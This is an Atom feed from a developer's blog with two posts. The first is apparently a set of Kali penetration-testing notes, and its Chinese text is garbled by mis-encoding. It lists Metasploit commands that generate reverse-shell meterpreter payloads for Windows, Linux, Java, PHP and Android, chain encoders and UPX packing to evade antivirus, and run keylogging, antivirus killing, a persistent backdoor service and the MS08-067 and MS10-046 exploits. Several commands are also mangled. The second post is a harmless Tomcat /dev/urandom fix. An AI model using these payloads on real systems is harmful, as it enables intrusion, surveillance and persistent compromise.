<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>沟通世界，实现梦想</title>
  <subtitle>一个有理想的开发者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rxxy.github.io/"/>
  <updated>2016-12-26T15:50:05.667Z</updated>
  <id>https://rxxy.github.io/</id>
  
  <author>
    <name>Rxxy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>kali��͸�ʼ�</title>
    <link href="https://rxxy.github.io/2016/12/26/kali%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    <id>https://rxxy.github.io/2016/12/26/kali渗透笔记/</id>
    <published>2016-12-26T15:45:39.379Z</published>
    <updated>2016-12-26T15:50:05.667Z</updated>
    
    <content type="html"><![CDATA[<p>#kali��͸�ʼ�<br>WindowsshellCode usege<br>/root����ľ��hello.exe</p>
<p>Lhost����ip</p>
<p>Lpost�����˿�</p>
<figure class="highlight plain"><figcaption><span>windows/meterpreter/reverse_tcp LHOST=192.168.159.128LPORT=1211 X��E>hello.exe</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">msf&gt; use exploit/multi/handler</div><div class="line">msfexploit(handler) &gt; set payloadwindows/meterpreter/reverse_tcp</div><div class="line">payload=&gt; windows/meterpreter/reverse_tcp</div><div class="line">msfexploit(handler) &gt; set LHOST 192.168.159.128</div><div class="line">LHOST=&gt; 192.168.159.128</div><div class="line">msfexploit(handler) &gt; set LPORT1211</div><div class="line">LPORT =&gt; 1211</div><div class="line">msfexploit(handler) &gt; exploit```��ʼ��������Ŀ��������ľ�����ɻ�ȡshell</div><div class="line"></div><div class="line">##### linux�¹����غ�</div><div class="line">```msfpayloadlinux/x86/meterpreter/rverse_tcp LHOST=192.168.159.128 LPORT=1212 X &gt;hello.sh</div><div class="line">msfexploit(handler) &gt; set payloadlinux/x86/meterpreter/reverse_tcp</div><div class="line">payload =&gt;linux/x86/meterpreter/reverse_tcp</div></pre></td></tr></table></figure>
<h5 id="java�¹����غ�"><a href="#java�¹����غ�" class="headerlink" title="java�¹����غ�"></a>java�¹����غ�</h5><figure class="highlight plain"><figcaption><span>java/meterpreter/reverse_tcp LHOST=192.168.159.128 LPORT=1212 X >hello.jar```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">##### php�¹����غ�</div><div class="line">```msfpayloadphp/meterpreter/reverse_tcpLHOST=192.168.159.128LPORT=R&gt;123.php</div></pre></td></tr></table></figure>
<h5 id="Android�¹����غ�"><a href="#Android�¹����غ�" class="headerlink" title="Android�¹����غ�"></a>Android�¹����غ�</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfpayloadandroid/meterpreter/reverse_tcp LHOST=192.168.159.LPORT=7777 R&gt; /root/hello.apk</div></pre></td></tr></table></figure>
<h5 id="shellCode��m"><a href="#shellCode��m" class="headerlink" title="shellCode��ɱ"></a>shellCode��ɱ</h5><h5 id="���ر�����m-��-��"><a href="#���ر�����m-��-��" class="headerlink" title="���ر�����ɱ(��)��"></a>���ر�����ɱ(��)��</h5><figure class="highlight plain"><figcaption><span>LPORT=R|Msfencode -ex86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw |msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/countdown -c 5-t exe -o</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-o/root/hello.exe</div></pre></td></tr></table></figure>
<h5 id="�ӿ�"><a href="#�ӿ�" class="headerlink" title="�ӿ�"></a>�ӿ�</h5><p>Upx-5hello.exe</p>
<h5 id="meterpreter��������"><a href="#meterpreter��������" class="headerlink" title="meterpreter��������"></a>meterpreter��������</h5><blockquote>
<p>screenshot����<br>sysinfoϵͳ��Ϣ<br>ps�鿴����<br>migrate 1323�л����̣�ʹľ���Ĵ������������ϣ�<br>Run post/windows/capture/keylog_recorder��¼��������</p>
</blockquote>
<h5 id="�־y���"><a href="#�־y���" class="headerlink" title="�־ÿ���"></a>�־ÿ���</h5><p>runpost/windows/manage/migrate�Զ��л�����<br>run killav�ر��������е�cmd<br>��������װ����<br>runmetsvc -A��װ����<br>ʹ�ú��ţ�<br>use exploit/multi/handler<br>setpayloadwindows/metsvc_bind_tcp<br>set RHOST 192.168.159.1<br>set LPORT 31337<br>exploit</p>
<h5 id="©�����a�"><a href="#©�����a�" class="headerlink" title="©�����ã�"></a>©�����ã�</h5><p>Ms10-046<br>useexploit/windows/browser/ms10_046_shortcut_icon_dllloader<br>SRVHOSTLHOST����Ϊ����ip<br>Payload��set payload windows/shell/reverse_tcp</p>
<p>Ms08-067<br>set payloadwindows/meterpreter/reverse_tcp<br>RHOSTLHOST</p>
<blockquote>
<p>Targets:<br>0Automatic Targeting<br> 1Windows 2000 Universal<br> 2Windows XP SP0/SP1 Universal<br> 3Windows 2003 SP0 Universal<br> 4Windows XP SP2 English (AlwaysOn NX)<br> 5Windows XP SP2 English (NX)<br> 6Windows XP SP3 English (AlwaysOn NX)<br> 7Windows XP SP3 English (NX)<br> 8Windows XP SP2 Arabic (NX)<br> 9Windows XP SP2 Chinese - Traditional / Taiwan (NX)<br> Windows XP SP2 Chinese - Simplified (NX)<br> Windows XP SP2 Chinese - Traditional (NX)<br> Windows XP SP2 Czech (NX)<br> Windows XP SP2 Danish (NX)<br> Windows XP SP2 German (NX)<br> Windows XP SP2 Greek (NX)<br> Windows XP SP2 Spanish (NX)<br> Windows XP SP2 Finnish (NX)<br> Windows XP SP2 French (NX)<br> Windows XP SP2 Hebrew (NX)<br> Windows XP SP2 Hungarian (NX)<br> Windows XP SP2 Italian (NX)<br> Windows XP SP2 Japanese (NX)<br> Windows XP SP2 Korean (NX)<br> Windows XP SP2 Dutch (NX)<br> Windows XP SP2 Norwegian (NX)<br> Windows XP SP2 Polish (NX)<br> Windows XP SP2 Portuguese - Brazilian (NX)<br> Windows XP SP2 Portuguese (NX)<br> Windows XP SP2 Russian (NX)<br> Windows XP SP2 Swedish (NX)<br> Windows XP SP2 Turkish (NX)<br> Windows XP SP3 Arabic (NX)<br> Windows XP SP3 Chinese - Traditional / Taiwan (NX)<br> Windows XP SP3 Chinese - Simplified (NX)<br> Windows XP SP3 Chinese - Traditional (NX)<br> Windows XP SP3 Czech (NX)<br> Windows XP SP3 Danish (NX)<br> Windows XP SP3 German (NX)<br> Windows XP SP3 Greek (NX)<br> Windows XP SP3 Spanish (NX)<br> Windows XP SP3 Finnish (NX)<br> Windows XP SP3 French (NX)<br> Windows XP SP3 Hebrew (NX)<br> Windows XP SP3 Hungarian (NX)<br> Windows XP SP3 Italian (NX)<br> Windows XP SP3 Japanese (NX)<br> Windows XP SP3 Korean (NX)<br> Windows XP SP3 Dutch (NX)<br> Windows XP SP3 Norwegian (NX)<br> Windows XP SP3 Polish (NX)<br> Windows XP SP3 Portuguese - Brazilian (NX)<br> Windows XP SP3 Portuguese (NX)<br> Windows XP SP3 Russian (NX)<br> Windows XP SP3 Swedish (NX)<br> Windows XP SP3 Turkish (NX)<br> Windows 2003 SP1 English (NO NX)<br> Windows 2003 SP1 English (NX)<br> Windows 2003 SP1 Japanese (NO NX)<br> Windows 2003 SP1 Spanish (NO NX)<br> Windows 2003 SP1 Spanish (NX)<br> Windows 2003 SP2 English (NO NX)<br> Windows 2003 SP2 English (NX)<br> Windows 2003 SP2 German (NO NX)<br> Windows 2003 SP2 German (NX)<br> Windows 2003 SP2 Portuguese - Brazilian (NX)<br> Windows 2003 SP2 Spanish (NO NX)<br> Windows 2003 SP2 Spanish (NX)<br> Windows 2003 SP2 Japanese (NO NX)</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#kali��͸�ʼ�&lt;br&gt;WindowsshellCode usege&lt;br&gt;/root����ľ��hello.exe&lt;/p&gt;
&lt;p&gt;Lhost����ip&lt;/p&gt;
&lt;p&gt;Lpost�����˿�&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tomcat 启动卡在部署项目时（linux）</title>
    <link href="https://rxxy.github.io/2016/11/14/Tomcat%20%E5%90%AF%E5%8A%A8%E5%8D%A1%E5%9C%A8%E9%83%A8%E7%BD%B2%E9%A1%B9%E7%9B%AE%E6%97%B6%EF%BC%88linux%EF%BC%89/"/>
    <id>https://rxxy.github.io/2016/11/14/Tomcat 启动卡在部署项目时（linux）/</id>
    <published>2016-11-14T12:26:58.817Z</published>
    <updated>2016-12-26T15:38:57.338Z</updated>
    
    <content type="html"><![CDATA[<p>#Tomcat 启动卡在部署项目时（linux）</p>
<p>找到<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">```securerandom.source=file:/dev/./urandom</div></pre></td></tr></table></figure></p>
<blockquote>
<p>这时候根据修改内容就可以查到因为此原因不仅可以造成tomcat卡住，也会造成weblogic启动缓慢，<br>linux或者部分unix系统提供随机数设备是<code>/dev/random</code>和<code>/dev/urandom</code>，两个有区别，<br><code>urandom</code>安全性没有<code>random</code>高，但random需要时间间隔生成随机数。jdk默认调用random。<br>再后来，终于在weblogic的官方文档中 Monitoring and Troubleshooting 找到了 Avoiding JVM Delays Caused ByRandom Number Generation 这样一个标题。摘录如下：</p>
<p>The library used for randomnumber generation in Sun’s JVM relies on /dev/random by default for UNIXplatforms. This can potentially block the Oracle WebLogic CommunicationServices process because on some operating systems /dev/random waits for acertain amount of “noise” to be generated on the host machine beforereturning a result. Although /dev/random is more secure, Oracle recommendsusing /dev/urandom if the default JVM configuration delays Oracle WebLogicCommunication Services startup.</p>
<p>To determine if your operatingsystem exhibits this behavior, try displaying a portion of the file from ashell prompt:</p>
<p>head -n 1 /dev/random<br>Open the<code>$JAVA_HOME/jre/lib/security/java.security</code> file in a text editor.</p>
<p>Change the line:</p>
<p>securerandom.source=file:/dev/random<br>to read:</p>
<p>securerandom.source=file:/dev/urandom<br>Save your change and exit thetext editor.<br>其中说到：可通过 head -n 1 /devrandom 查看是否你的系统会出现伪随机数提供等待。OK就这个，试了一下，果然，在服务器第一次启动后，这个可以快速提供一个值，但当再次调用时发生等待。</p>
</blockquote>
<p>解决办法：</p>
<p>永久：oracle 说修改$JAVA_HOME/jre/lib/security/java.security文件，替换<code>securerandom.source=file:/dev/random</code>为<code>securerandom.source=file:/dev/urandom</code>。对所有使用JVM的应用生效。（这个永久的方法，这里面有个问题，就是设置时候实际应该设置为<code>securerandom.source=file:/dev/./urandom</code>，否则不生效）</p>
<p>DOMAIN临时：修改startWeblogic.sh文件，JAVA_OPTIONS=”${SAVE_JAVA_OPTIONS}-Djava.security.egd=file:/dev/./urandom”</p>
<p>后继的SecureRandom 测试学习</p>
<p>编写JAVA类如下，运行测试，第一次正常，第二次等待，重启服务器后第一次又正常。启动加入参数<code>-Djava.security.egd=file:/dev/./urandom</code> 正常</p>
<p>来自<a href="[http://blog.csdn.net/njchenyi/article/details/46641141](http://blog.csdn.net/njchenyi/article/details/46641141)">[http://blog.csdn.net/njchenyi/article/details/46641141](http://blog.csdn.net/njchenyi/article/details/46641141)</a></p>
<p>原文地址：<a href="http://blog.csdn.net/njchenyi/article/details/46641141" target="_blank" rel="external">http://blog.csdn.net/njchenyi/article/details/46641141</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#Tomcat 启动卡在部署项目时（linux）&lt;/p&gt;
&lt;p&gt;找到&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
